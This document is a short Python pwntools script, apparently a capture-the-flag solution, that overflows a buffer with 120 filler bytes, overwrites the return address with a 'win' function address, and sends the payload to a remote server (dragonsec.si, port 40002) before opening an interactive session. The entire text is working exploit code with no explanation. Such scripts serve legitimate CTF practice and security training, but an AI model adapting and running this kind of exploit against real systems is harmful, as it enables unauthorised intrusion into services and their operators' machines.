from pwn import*
win_adr=p64(0x0400648)
payload = b'A' * 120
payload += win_adr

p=remote("dragonsec.si",40002)

p.sendline(payload)
p.interactive()
